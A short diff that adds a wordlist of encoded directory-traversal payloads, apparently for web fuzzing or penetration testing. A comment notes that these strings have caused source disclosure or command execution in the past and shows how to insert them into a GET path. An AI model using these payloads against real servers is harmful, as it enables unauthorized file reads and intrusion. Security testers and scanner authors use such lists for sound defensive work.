@@ -1,0 +1,8 @@
+# single directory traversals that have caused showcode or command exec issues in the past
+# GET /path/*payload*relative/path/to/target/file/
+..%255c
+.%5c../..%5c
+/..%c0%9v../
+/..%c0%af../
+/..%255c..%255c
+
